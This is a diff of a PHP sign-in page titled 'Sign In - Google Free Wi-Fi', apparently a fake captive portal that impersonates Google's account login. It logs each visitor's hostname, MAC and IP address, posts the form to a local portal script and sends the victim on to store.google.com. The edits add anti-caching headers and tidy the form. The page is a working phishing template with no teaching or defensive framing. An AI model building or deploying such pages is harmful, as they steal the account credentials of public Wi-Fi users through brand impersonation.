@@ -9,6 +9,9 @@ require_once('helper.php');
 <meta charset="utf-8">
 <meta name="viewport" content="width=394, user-scalable=no">
 <title>Sign In - Google Free Wi-Fi</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
 <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
 <link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"/>
 
@@ -23,7 +26,7 @@ require_once('helper.php');
 
 </head>
 <body>
-<form novalidate action="/captiveportal/index.php" method="POST" onsubmit="redirect()">
+<form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
 	<img src="assets/img/1ckkcu79ho.gif" alt="">
 	<h1>Sign in</h1>
 	<h2>with your Google Account</h2>
@@ -32,12 +35,12 @@ require_once('helper.php');
 	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-	<input type="hidden" name="target" value="<?=$destination?>">
+	<input type="hidden" name="target" value="https://store.google.com/">
 	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
-	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
+	<p><a href="">More options</a><span class="text-right"><button type="submit">NEXT</button></span></p>
 </form>
 <footer>
-	English (United States) <img src="assets/img/mq40xx0kce.gif" alt="">
+	English (United States)<img src="assets/img/mq40xx0kce.gif" alt="">
 	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
 </footer>
 <script>document.onload = function() { document.getElementById("user").focus();};</script>
